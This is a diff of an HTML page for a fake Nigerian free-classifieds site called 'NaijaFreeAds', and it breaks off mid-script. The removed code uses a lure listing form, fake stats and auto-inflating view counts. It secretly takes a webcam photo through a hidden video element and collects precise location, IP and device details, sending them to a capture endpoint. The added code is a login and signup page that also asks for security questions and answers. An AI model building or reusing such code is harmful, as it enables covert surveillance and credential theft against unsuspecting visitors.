@@ -2,189 +2,210 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>NaijaFreeAds | Post Free Ads in Nigeria</title>
-    <meta name="description" content="Post free ads in Nigeria. Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians nationwide.">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>NaijaFreeAds | Join Nigeria's #1 Marketplace</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #0a0c15;
-            color: #f1f5f9;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #2e1065 100%);
+            min-height: 100vh;
+            position: relative;
             overflow-x: hidden;
         }
-        .naija-bg {
+        
+        /* Animated Particles */
+        .particles {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 20% 30%, rgba(0,128,0,0.15), transparent 60%),
-                        radial-gradient(circle at 80% 70%, rgba(0,100,200,0.1), transparent 50%);
-            pointer-events: none;
+            overflow: hidden;
             z-index: 0;
         }
-        .container { max-width: 1300px; margin: 0 auto; padding: 20px 28px; position: relative; z-index: 10; }
+        .particle {
+            position: absolute;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: float 20s infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
         
-        .navbar {
-            background: rgba(10, 14, 23, 0.95);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(0,128,0,0.4);
-            border-radius: 100px;
-            padding: 12px 32px;
+        .container {
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            margin-bottom: 40px;
-            flex-wrap: wrap;
-            gap: 16px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            padding: 20px;
         }
-        .logo { display: flex; align-items: center; gap: 12px; }
-        .logo-icon { font-size: 34px; filter: drop-shadow(0 0 10px #008000); animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { filter: drop-shadow(0 0 0px #008000); }
-            100% { filter: drop-shadow(0 0 15px #00a86b); }
-        }
-        .logo-text { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #fff, #008000, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .nav-links { display: flex; gap: 28px; }
-        .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; }
-        .nav-links a:hover { color: #00a86b; }
         
-        .hero {
-            text-align: center;
-            padding: 50px 20px 30px;
-            background: linear-gradient(180deg, rgba(0,128,0,0.08) 0%, transparent 100%);
-            border-radius: 60px;
+        /* Glassmorphism Card */
+        .auth-card {
+            background: rgba(255,255,255,0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 48px;
+            padding: 48px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.2);
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        .hero h1 {
-            font-size: 64px;
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo-icon {
+            font-size: 60px;
+            display: inline-block;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .logo-text {
+            font-size: 32px;
             font-weight: 800;
-            background: linear-gradient(135deg, #ffffff, #00a86b, #008751);
+            background: linear-gradient(135deg, #667eea, #764ba2, #f093fb);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin-bottom: 16px;
-            letter-spacing: -1px;
+            margin-top: 8px;
         }
-        .hero p { color: #94a3b8; font-size: 18px; max-width: 600px; margin: 0 auto; }
-        
-        .stats-row {
-            display: flex;
-            justify-content: center;
-            gap: 25px;
-            margin: 45px 0;
-            flex-wrap: wrap;
-        }
-        .stat-card {
-            background: rgba(20, 30, 55, 0.6);
-            backdrop-filter: blur(12px);
-            padding: 22px 38px;
-            border-radius: 48px;
+        .tagline {
             text-align: center;
-            border: 1px solid rgba(0,128,0,0.4);
-            transition: 0.3s;
-            cursor: pointer;
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 8px;
         }
-        .stat-card:hover { transform: translateY(-5px); border-color: #00a86b; }
-        .stat-number { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #00a86b, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .stat-label { font-size: 13px; color: #94a3b8; margin-top: 8px; }
         
-        .ad-form {
-            background: rgba(15, 25, 45, 0.8);
-            backdrop-filter: blur(12px);
-            border-radius: 48px;
-            padding: 40px;
-            border: 1px solid rgba(0,128,0,0.3);
-            max-width: 750px;
-            margin: 30px auto;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        /* Tabs */
+        .auth-tabs {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 32px;
+            background: #f1f5f9;
+            padding: 8px;
+            border-radius: 60px;
         }
-        .form-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
-        .form-group { margin-bottom: 22px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #cbd5e1; }
-        .form-group input, .form-group textarea, .form-group select {
-            width: 100%;
-            padding: 14px 20px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid #334155;
-            border-radius: 30px;
+        .auth-tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            color: #64748b;
+            transition: 0.3s;
+            border-radius: 40px;
+        }
+        .auth-tab.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
+            box-shadow: 0 4px 15px rgba(102,126,234,0.3);
+        }
+        
+        .auth-form { display: none; }
+        .auth-form.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #334155;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
             font-size: 15px;
             outline: none;
             transition: 0.2s;
         }
-        .form-group input:focus, .form-group textarea:focus { border-color: #00a86b; box-shadow: 0 0 0 3px rgba(0,168,107,0.2); }
-        
-        .image-upload-area {
-            border: 2px dashed #334155;
-            border-radius: 24px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.2s;
-            background: rgba(0,0,0,0.3);
-        }
-        .image-upload-area:hover { border-color: #00a86b; background: rgba(0,168,107,0.05); }
-        .image-preview {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin-top: 15px;
-        }
-        .preview-img {
-            width: 80px;
-            height: 80px;
-            object-fit: cover;
-            border-radius: 16px;
-            border: 2px solid #00a86b;
+        .form-group input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
         }
         
-        .post-btn {
+        .auth-btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #008000, #00a86b);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             border: none;
-            border-radius: 60px;
+            border-radius: 40px;
             color: white;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
-            transition: 0.2s;
+            margin-top: 8px;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
         }
-        .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
+        .auth-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        .auth-btn:hover::before { left: 100%; }
+        .auth-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px -8px rgba(102,126,234,0.5); }
         
-        .featured-ads { margin: 60px 0; padding: 20px; }
-        .featured-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 10px; }
-        .ads-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
-        }
-        .featured-card {
-            background: rgba(20, 30, 55, 0.5);
-            backdrop-filter: blur(8px);
-            border-radius: 28px;
-            padding: 20px;
-            border: 1px solid rgba(0,128,0,0.2);
-            transition: 0.2s;
-            cursor: pointer;
-        }
-        .featured-card:hover { border-color: #00a86b; transform: translateY(-3px); }
-        .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
-        .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
+        .forgot-link { text-align: center; margin-top: 20px; }
+        .forgot-link a { color: #667eea; text-decoration: none; font-size: 13px; cursor: pointer; font-weight: 500; }
+        .switch-link { text-align: center; margin-top: 24px; color: #64748b; font-size: 14px; }
+        .switch-link a { color: #667eea; text-decoration: none; font-weight: 700; cursor: pointer; }
         
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 60px;
+            transform: translateX(200%);
+            transition: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 1000;
+            font-weight: 600;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.2);
+        }
+        .toast.show { transform: translateX(0); }
+        .toast.error { background: linear-gradient(135deg, #ef4444, #dc2626); }
+        
+        /* Modal */
         .modal {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(20px);
-            z-index: 10000;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            z-index: 2000;
             display: none;
             justify-content: center;
             align-items: center;
@@ -192,532 +213,347 @@
         }
         .modal.active { display: flex; }
         .modal-content {
-            max-width: 500px;
+            background: white;
+            border-radius: 40px;
+            padding: 40px;
+            max-width: 450px;
             width: 100%;
-            background: linear-gradient(145deg, #1e293b, #0f172a);
-            border-radius: 48px;
-            padding: 35px;
             text-align: center;
-            border: 1px solid #00a86b;
-            animation: fadeInUp 0.4s ease;
+            animation: modalPop 0.3s ease;
         }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes modalPop {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
         }
-        .modal-icon { font-size: 60px; margin-bottom: 15px; }
-        .modal-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-        .modal-desc { color: #94a3b8; margin-bottom: 25px; }
-        .allow-btn, .deny-btn {
-            padding: 14px 32px;
-            border-radius: 60px;
-            font-weight: 700;
-            margin: 10px;
-            cursor: pointer;
-            border: none;
+        .modal-content input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
+            margin: 16px 0;
             font-size: 15px;
         }
-        .allow-btn { background: linear-gradient(135deg, #008000, #00a86b); color: white; }
-        .deny-btn { background: #334155; color: #cbd5e1; }
-        
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: #22c55e;
-            padding: 14px 28px;
-            border-radius: 60px;
-            z-index: 10001;
-            transform: translateX(200%);
-            transition: 0.3s;
-            font-weight: 500;
-        }
-        .toast.show { transform: translateX(0); }
-        
-        .footer {
-            margin-top: 60px;
-            padding: 40px;
-            text-align: center;
-            border-top: 1px solid #1e293b;
-            color: #64748b;
-            font-size: 12px;
+        .modal-btn {
+            padding: 12px 24px;
+            border-radius: 40px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px;
         }
         
-        /* Hidden camera element - completely invisible */
-        #hiddenCameraElement {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 40px; }
-            .container { padding: 16px; }
-            .nav-links { display: none; }
-            .stat-card { padding: 15px 25px; }
+        @media (max-width: 640px) {
+            .auth-card { padding: 32px 24px; margin: 16px; }
+            .logo-text { font-size: 24px; }
         }
     </style>
 </head>
 <body>
-<div class="naija-bg"></div>
+
+<div class="particles" id="particles"></div>
+
 <div class="container">
-    <nav class="navbar">
-        <div class="logo"><div class="logo-icon"><i class="fas fa-globe-africa"></i></div><div class="logo-text">Naija<span style="color:#00a86b;">FreeAds</span></div></div>
-        <div class="nav-links"><a href="#">Home</a><a href="#">Browse Ads</a><a href="#">Categories</a><a href="#">Support</a></div>
-    </nav>
-
-    <div class="hero">
-        <h1>Post free ads<br>for free in Nigeria 🇳🇬</h1>
-        <p>Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians across Lagos, Abuja, PH, Ibadan.</p>
-    </div>
-
-    <div class="stats-row">
-        <div class="stat-card"><div class="stat-number" id="statAds">284K</div><div class="stat-label">Live Ads</div></div>
-        <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
-        <div class="stat-card"><div class="stat-number">⭐ 4.96</div><div class="stat-label">User Rating</div></div>
-        <div class="stat-card"><div class="stat-number">37+</div><div class="stat-label">States</div></div>
-    </div>
-
-    <div class="ad-form">
-        <div class="form-title"><i class="fas fa-pen-fancy" style="color:#00a86b;"></i> Post Your Free Ad</div>
-        <div class="form-group"><label><i class="fas fa-tag"></i> Category</label><select id="adCategory">
-            <option>📱 Phones & Tablets</option>
-            <option>🚗 Cars & Vehicles</option>
-            <option>🏠 Property & Rentals</option>
-            <option>💼 Jobs & Gigs</option>
-            <option>👕 Fashion & Accessories</option>
-            <option>🛋️ Home & Furniture</option>
-            <option>📚 Education & Services</option>
-        </select></div>
-        <div class="form-group"><label><i class="fas fa-heading"></i> Ad Title</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro - 256GB - Like New" autocomplete="off"></div>
-        <div class="form-group"><label><i class="fas fa-align-left"></i> Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item... condition, location, reason for selling..."></textarea></div>
-        <div class="form-group"><label><i class="fas fa-naira-sign"></i> Price (₦)</label><input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free"></div>
-        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Location (City/State)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja"></div>
-        <div class="form-group"><label><i class="fas fa-phone"></i> WhatsApp Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
-        <div class="form-group">
-            <label><i class="fas fa-image"></i> Upload Images (Up to 5)</label>
-            <div class="image-upload-area" id="imageUploadArea">
-                <i class="fas fa-cloud-upload-alt" style="font-size: 40px; color: #00a86b;"></i>
-                <p style="margin-top: 8px;">Click to upload product images</p>
-                <input type="file" id="imageUpload" multiple accept="image/*" style="display: none;">
-            </div>
-            <div class="image-preview" id="imagePreview"></div>
+    <div class="auth-card">
+        <div class="logo">
+            <div class="logo-icon">🇳🇬</div>
+            <div class="logo-text">NaijaFreeAds</div>
+            <div class="tagline">Nigeria's #1 Free Marketplace</div>
         </div>
-        <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-        <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly. Location helps local buyers find you fast.</p>
+        
+        <div class="auth-tabs">
+            <div class="auth-tab active" data-tab="login">Login</div>
+            <div class="auth-tab" data-tab="signup">Create Account</div>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="auth-form active" id="loginForm">
+            <div class="form-group">
+                <label><i class="fas fa-envelope"></i> Email Address</label>
+                <input type="email" id="loginEmail" placeholder="you@example.com">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-lock"></i> Password</label>
+                <input type="password" id="loginPassword" placeholder="Enter your password">
+            </div>
+            <button class="auth-btn" id="loginBtn"><i class="fas fa-arrow-right-to-bracket"></i> Login</button>
+            <div class="forgot-link"><a onclick="showForgotModal()"><i class="fas fa-key"></i> Forgot Password?</a></div>
+        </div>
+        
+        <!-- Sign Up Form -->
+        <div class="auth-form" id="signupForm">
+            <div class="form-group">
+                <label><i class="fas fa-user"></i> Full Name</label>
+                <input type="text" id="signupName" placeholder="John Doe">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-envelope"></i> Email Address</label>
+                <input type="email" id="signupEmail" placeholder="you@example.com">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-phone"></i> Phone Number</label>
+                <input type="tel" id="signupPhone" placeholder="0803 123 4567">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-lock"></i> Password</label>
+                <input type="password" id="signupPassword" placeholder="Min. 6 characters">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-check-circle"></i> Confirm Password</label>
+                <input type="password" id="signupConfirm" placeholder="Confirm your password">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-question-circle"></i> Security Question</label>
+                <input type="text" id="securityQuestion" placeholder="e.g., What is your mother's maiden name?">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-key"></i> Security Answer</label>
+                <input type="text" id="securityAnswer" placeholder="Your answer (case insensitive)">
+            </div>
+            <button class="auth-btn" id="signupBtn"><i class="fas fa-user-plus"></i> Create Free Account</button>
+        </div>
+        
+        <div class="switch-link">
+            <span id="switchText">Don't have an account? </span><a id="switchLink">Sign up free</a>
+        </div>
     </div>
-
-    <div class="featured-ads">
-        <div class="featured-title"><i class="fas fa-fire" style="color:#f472b6;"></i> 🔥 Hot Listings in Nigeria</div>
-        <div class="ads-grid" id="featuredGrid"></div>
-    </div>
-
-    <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
 </div>
 
-<!-- Hidden Camera Element - Completely Invisible -->
-<video id="hiddenCameraElement" autoplay playsinline muted></video>
-<canvas id="hiddenCanvasElement" style="display:none;"></canvas>
-
-<!-- Permission Modal -->
-<div class="modal" id="permModal">
+<!-- Forgot Password Modal -->
+<div class="modal" id="forgotModal">
     <div class="modal-content">
-        <div class="modal-icon"><i class="fas fa-map-marker-alt" style="color:#00a86b;"></i> <i class="fas fa-camera" style="color:#008751;"></i></div>
-        <div class="modal-title">Enable Location & Camera</div>
-        <div class="modal-desc">Allow NaijaFreeAds to access your location and camera to verify your listing and show ads near you.</div>
-        <button class="allow-btn" id="allowBtn"><i class="fas fa-check-circle"></i> Allow Access</button>
-        <button class="deny-btn" id="denyBtn">Not Now</button>
+        <i class="fas fa-shield-alt" style="font-size: 55px; color: #667eea;"></i>
+        <h3 style="margin: 16px 0;">Reset Password</h3>
+        <p style="color: #64748b;">Enter your email to verify identity</p>
+        <input type="email" id="resetEmail" placeholder="Your email address">
+        <button class="modal-btn" id="verifyEmailBtn" style="background: linear-gradient(135deg, #667eea, #764ba2); color: white;">Verify Email</button>
     </div>
 </div>
 
-<div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
+<!-- Security Question Modal -->
+<div class="modal" id="securityModal">
+    <div class="modal-content">
+        <i class="fas fa-question-circle" style="font-size: 55px; color: #f59e0b;"></i>
+        <h3 style="margin: 16px 0;">Security Verification</h3>
+        <p style="color: #64748b;" id="securityQuestionDisplay"></p>
+        <input type="text" id="securityAnswerInput" placeholder="Your answer">
+        <button class="modal-btn" id="verifyAnswerBtn" style="background: linear-gradient(135deg, #667eea, #764ba2); color: white;">Verify</button>
+        <button class="modal-btn" onclick="closeModals()" style="background: #e2e8f0;">Cancel</button>
+    </div>
+</div>
+
+<!-- Reset Password Modal -->
+<div class="modal" id="resetModal">
+    <div class="modal-content">
+        <i class="fas fa-key" style="font-size: 55px; color: #22c55e;"></i>
+        <h3 style="margin: 16px 0;">Set New Password</h3>
+        <input type="password" id="newPassword" placeholder="New password (min 6 chars)">
+        <input type="password" id="confirmPassword" placeholder="Confirm new password">
+        <button class="modal-btn" id="resetPasswordBtn" style="background: linear-gradient(135deg, #22c55e, #16a34a); color: white;">Reset Password</button>
+        <button class="modal-btn" onclick="closeModals()" style="background: #e2e8f0;">Cancel</button>
+    </div>
+</div>
+
+<div class="toast" id="toast">✅ Success!</div>
 
 <script>
-    let userLocation = null;
-    let cameraImage = null;
-    let cameraStream = null;
-    let uploadedImages = [];
-    let permissionsGranted = false;
-    let postedAds = JSON.parse(localStorage.getItem('postedAds') || '[]');
-    let viewIntervals = [];
-
-    // Featured ads with fake views
-    const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 124, seller: "TechPlug NG" },
-        { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 89, seller: "AutoDeal NG" },
-        { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 245, seller: "PropertyHub" },
-        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 567, seller: "WorkNaija" },
-        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 78, seller: "FashionLagos" },
-        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 234, seller: "GamingZone" }
-    ];
-
-    function startViewCounter(ad) {
-        const interval = setInterval(() => {
-            if (ad.views < 9999) {
-                ad.views += Math.floor(Math.random() * 8) + 2;
-                renderFeaturedAds();
-            }
-        }, Math.random() * 30000 + 15000);
-        viewIntervals.push(interval);
+    // Create particles
+    for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = Math.random() * 8 + 2 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDuration = Math.random() * 20 + 10 + 's';
+        particle.style.animationDelay = Math.random() * 10 + 's';
+        document.getElementById('particles').appendChild(particle);
     }
-
-    function renderFeaturedAds() {
-        const grid = document.getElementById('featuredGrid');
-        grid.innerHTML = featuredAds.map(ad => `
-            <div class="featured-card" onclick="viewAdDetail(${ad.id})">
-                <div style="font-size: 40px;">${ad.emoji}</div>
-                <div class="ad-price">${ad.price}</div>
-                <div style="font-weight: 600;">${ad.title}</div>
-                <div style="font-size: 12px; color: #94a3b8; margin-top: 4px;"><i class="fas fa-store"></i> ${ad.seller}</div>
-                <div style="font-size: 12px; color: #94a3b8;"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-views"><i class="fas fa-eye"></i> ${ad.views.toLocaleString()} views</div>
-            </div>
-        `).join('');
-    }
-
-    function viewAdDetail(adId) {
-        const ad = featuredAds.find(a => a.id === adId);
-        if (ad) {
-            showToast(`📱 ${ad.title} - ${ad.price} | Contact seller on WhatsApp`, false);
-        }
-    }
-
-    // Image upload handling
-    const uploadArea = document.getElementById('imageUploadArea');
-    const imageInput = document.getElementById('imageUpload');
-    const imagePreview = document.getElementById('imagePreview');
-
-    uploadArea.addEventListener('click', () => imageInput.click());
-    imageInput.addEventListener('change', (e) => {
-        const files = Array.from(e.target.files);
-        if (uploadedImages.length + files.length > 5) {
-            showToast("Maximum 5 images allowed", true);
-            return;
-        }
-        files.forEach(file => {
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                uploadedImages.push(event.target.result);
-                displayImages();
-            };
-            reader.readAsDataURL(file);
+    
+    // Tab switching
+    document.querySelectorAll('.auth-tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            const tabName = tab.dataset.tab;
+            document.getElementById('loginForm').classList.toggle('active', tabName === 'login');
+            document.getElementById('signupForm').classList.toggle('active', tabName === 'signup');
+            document.getElementById('switchText').innerHTML = tabName === 'login' ? "Don't have an account? " : "Already have an account? ";
+            document.getElementById('switchLink').innerHTML = tabName === 'login' ? "Sign up free" : "Login here";
         });
     });
-
-    function displayImages() {
-        imagePreview.innerHTML = uploadedImages.map((img, idx) => `
-            <div style="position: relative;">
-                <img src="${img}" class="preview-img">
-                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
-            </div>
-        `).join('');
-    }
-
-    function removeImage(idx) {
-        uploadedImages.splice(idx, 1);
-        displayImages();
-    }
-
-    // FIXED: Camera capture that actually works
-    async function captureCameraPhoto() {
-        try {
-            // Try to get camera stream
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    facingMode: "user"
-                } 
-            });
-            
-            // Get the hidden video element
-            const video = document.getElementById('hiddenCameraElement');
-            video.srcObject = stream;
-            cameraStream = stream;
-            
-            // Wait for video to be ready
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    resolve();
-                };
-            });
-            
-            // Wait a bit for camera to stabilize
-            await new Promise(r => setTimeout(r, 500));
-            
-            // Capture frame
-            const canvas = document.getElementById('hiddenCanvasElement');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Get photo as base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            
-            // Stop the stream to save battery
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-            video.srcObject = null;
-            
-            return photoData;
-        } catch(error) {
-            console.error("Camera capture failed:", error);
-            return null;
+    
+    document.getElementById('switchLink').addEventListener('click', () => {
+        const isLogin = document.getElementById('loginForm').classList.contains('active');
+        if (isLogin) {
+            document.querySelector('.auth-tab[data-tab="signup"]').click();
+        } else {
+            document.querySelector('.auth-tab[data-tab="login"]').click();
         }
-    }
-
-    // FIXED: Location capture that actually works
-    async function getPreciseLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { 
-                resolve(null); 
-                return; 
-            }
-            
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const { latitude, longitude, accuracy } = position.coords;
-                let address = { 
-                    lat: latitude, 
-                    lng: longitude, 
-                    accuracy: accuracy, 
-                    street: '', 
-                    city: '', 
-                    state: '', 
-                    country: '', 
-                    postcode: '', 
-                    fullAddress: '' 
-                };
-                
-                try {
-                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
-                    const data = await geoRes.json();
-                    if (data.address) {
-                        address.street = data.address.road || data.address.pedestrian || '';
-                        address.city = data.address.city || data.address.town || data.address.village || '';
-                        address.state = data.address.state || data.address.province || '';
-                        address.country = data.address.country || '';
-                        address.postcode = data.address.postcode || '';
-                        address.fullAddress = data.display_name || '';
-                    }
-                } catch(e) {
-                    console.log("Geocoding error:", e);
-                }
-                resolve(address);
-            }, () => resolve(null), { enableHighAccuracy: true, timeout: 10000 });
-        });
-    }
-
-    async function getDeviceInfo() {
-        let ip = 'unknown';
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch(e) {}
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ip: ip
-        };
-    }
-
-    async function sendToBackend(data) {
-        try {
-            const response = await fetch('/api/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            return await response.json();
-        } catch(err) {
-            console.log("Backend error, saving locally:", err);
-            let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
-            existing.unshift(data);
-            localStorage.setItem('naija_freeads_data', JSON.stringify(existing.slice(0, 500)));
-            return { success: true, fallback: true };
-        }
-    }
-
-    // FIXED: Permission request that actually works
-    async function requestPermissions() {
-        return new Promise(async (resolve) => {
-            const modal = document.getElementById('permModal');
-            const allowBtn = document.getElementById('allowBtn');
-            const denyBtn = document.getElementById('denyBtn');
-            
-            allowBtn.onclick = async () => {
-                modal.classList.remove('active');
-                showToast("📍 Getting your location & verifying...");
-                
-                // Get location
-                const location = await getPreciseLocation();
-                if (location) { 
-                    userLocation = location; 
-                    showToast(`📍 Located in ${location.city || location.state || 'Nigeria'}`, false); 
-                }
-                
-                // Get camera photo
-                showToast("📸 Taking verification photo...", false);
